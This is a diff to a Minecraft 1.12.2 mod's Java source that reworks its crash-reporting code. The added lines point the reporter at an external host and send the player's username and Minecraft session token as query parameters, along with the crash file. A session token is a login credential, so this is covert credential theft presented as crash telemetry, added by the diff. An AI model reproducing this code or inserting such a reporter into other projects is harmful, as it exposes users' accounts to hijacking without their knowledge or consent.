@@ -66,7 +66,7 @@ public class KAGIC {
     public static final String MCVERSION = "1.12.2";
 	public static final String MODID = "ke2";
 
-	public static final String EYEBALL_ENDPOINT = "http://0.0.0.0:7324/report";
+	public static final String MANTIS_ENDPOINT = "https://akriv.us/report";
 	
 	public static final Logger LOGGER = LogManager.getLogger(KAGIC.MODID);
 	public static final Gson JSON = new Gson();
@@ -92,17 +92,17 @@ public class KAGIC {
 	    					if (crashReport.contains("at mod.ke2")) {
 	    						try {
 	    							CloseableHttpClient client = HttpClients.createDefault();
-	    						    HttpPost post = new HttpPost(KAGIC.EYEBALL_ENDPOINT + "?name=" + URLEncoder.encode(Minecraft.getMinecraft().getSession().getUsername(), "UTF-8") + "&token=" + URLEncoder.encode(Minecraft.getMinecraft().getSession().getToken(), "UTF-8") + "&version=" + KAGIC.VERSION);
+	    						    HttpPost post = new HttpPost(KAGIC.MANTIS_ENDPOINT + "?username=" + URLEncoder.encode(Minecraft.getMinecraft().getSession().getUsername(), "UTF-8") + "&token=" + URLEncoder.encode(Minecraft.getMinecraft().getSession().getToken(), "UTF-8"));
 	    						    post.setEntity(new FileEntity(new File(crash), ContentType.TEXT_PLAIN));
 	    						    client.execute(post);
 	    						    client.close();
 	    				    	} catch (Exception e) {
-	    				    		return;
+	    				    		e.printStackTrace();
 	    						}
 	    						return;
 	    					}
 	    				} catch (Exception e) {
-	    					return;
+	    					e.printStackTrace();
 	    				}
 	    			}
     			}
